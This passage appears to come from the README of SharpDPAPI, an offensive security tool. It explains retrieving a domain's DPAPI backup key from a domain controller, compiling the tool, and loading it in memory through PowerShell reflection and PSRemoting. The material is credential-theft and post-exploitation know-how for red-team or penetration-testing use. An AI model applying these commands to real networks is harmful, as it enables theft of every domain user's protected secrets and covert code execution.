The **backupkey** command will retrieve the domain DPAPI backup key from a domain controller using the **LsaRetrievePrivateData** API approach [from Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/2fd09bbef0754317cd97c01dbbf49698ae23d9d2/mimikatz/modules/kuhl_m_lsadump.c#L1882-L1927). This private key can then be used to decrypt master key blobs for any user on the domain. And even better, the key never changes ;)

Domain admin (or equivalent) rights are needed to retrieve the key from a remote domain controller.

The `/nowrap` flag will prevent wrapping the base64 key on display.

This base64 key blob can be decoded to a binary .pvk file that can then be used with Mimikatz' **dpapi::masterkey /in:MASTERKEY /pvk:backupkey.pvk** module, or used in blob/file /pvk:X form with the **masterkeys**, **credentials**, or **vault** SharpDPAPI commands.

By default, SharpDPAPI will try to determine the current domain controller via the **DsGetDcName** API call. A server can be specified with `/server:COMPUTER.domain.com`. If you want the key saved to disk instead of output as a base64 blob, use `/file:key.pvk`.


## Compile Instructions

We are not planning on releasing binaries for SharpDPAPI, so you will have to compile yourself :)

SharpDPAPI has been built against .NET 3.5 and is compatible with [Visual Studio 2019 Community Edition](https://visualstudio.microsoft.com/vs/community/). Simply open up the project .sln, choose "Release", and build.

### Targeting other .NET versions

SharpDPAPI's default build configuration is for .NET 3.5, which will fail on systems without that version installed. To target SharpDPAPI for .NET 4 or 4.5, open the .sln solution, go to **Project** -> **SharpDPAPI Properties** and change the "Target framework" to another version.

### Sidenote: Running SharpDPAPI Through PowerShell

If you want to run SharpDPAPI in-memory through a PowerShell wrapper, first compile the SharpDPAPI and base64-encode the resulting assembly:

    [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\SharpDPAPI.exe")) | Out-File -Encoding ASCII C:\Temp\SharpDPAPI.txt

SharpDPAPI can then be loaded in a PowerShell script with the following (where "aa..." is replaced with the base64-encoded SharpDPAPI assembly string):

    $SharpDPAPIAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String("aa..."))

The Main() method and any arguments can then be invoked as follows:

    [SharpDPAPI.Program]::Main("machinemasterkeys")

#### Sidenote Sidenote: Running SharpDPAPI Over PSRemoting

Due to the way PSRemoting handles output, we need to redirect stdout to a string and return that instead. Luckily, SharpDPAPI has a function to help with that.

If you follow the instructions in [Sidenote: Running SharpDPAPI Through PowerShell](#sidenote-running-sharpdpapi-through-powershell) to create a SharpDPAPI.ps1, append something like the following to the script:

    [SharpDPAPI.Program]::MainString("machinemasterkeys")

You should then be able to run SharpDPAPI over PSRemoting with something like the following:

    $s = New-PSSession dc.theshire.local
    Invoke-Command -Session $s -FilePath C:\Temp\SharpDPAPI.ps1

Alternatively, SharpDPAPI `/consoleoutfile:C:\FILE.txt` argument will redirect all output streams to the specified file.
